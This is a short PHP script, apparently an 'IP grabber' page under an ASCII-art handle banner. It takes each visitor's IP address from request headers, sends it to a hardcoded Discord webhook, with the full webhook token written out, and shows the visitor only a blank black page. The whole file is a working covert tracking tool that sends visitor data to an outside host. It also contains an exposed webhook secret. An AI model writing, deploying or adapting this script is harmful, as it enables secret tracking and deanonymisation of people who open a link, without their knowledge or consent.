//  .   ___                      _  _   ___________  _______  _______   
//   __| _/____ ______   ____ __| || |_/_   \   _  \ \   _  \ \   _  \  
//  / __ |/  _ \\____ \_/ __ \\   __   /|   /  /_\  \/  /_\  \/  /_\  \ 
// / /_/ (  <_> )  |_> >  ___/ |  ||  | |   \  \_/   \  \_/   \  \_/   \
// \____ |\____/|   __/ \___  >_  ~~  _\|___|\_____  /\_____  /\_____  /
//      \/      |__|        \/  |_||_|             \/       \/       \/ 

<?php

function getUserIP() {

    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return 'UNKNOWN';
}

$userIP = getUserIP();

$webhookURL = "https://discord.com/api/webhooks/1149051199476207810/35UWzU2LotigsQajWZ-su4_HzuCsJpHqvJINhUDYWT_tDDGwtEAMQo2fOOqmBLhuZ3Z_";

$data = array(
    "content" => "User IP: " . $userIP
);

$options = array(
    "http" => array(
        "header" => "Content-Type: application/json",
        "method" => "POST",
        "content" => json_encode($data)
    )
);
$context = stream_context_create($options);
$result = file_get_contents($webhookURL, false, $context);

if ($result === FALSE) {

    echo "An error occurred while sending the message.";
} else {

    echo "User IP sent to Discord.";
}
?>

<html>
<center><h1> </h1></center>
<center><p>  </p></center>

<body style=background-color:rgb(6,6,6)>
</html>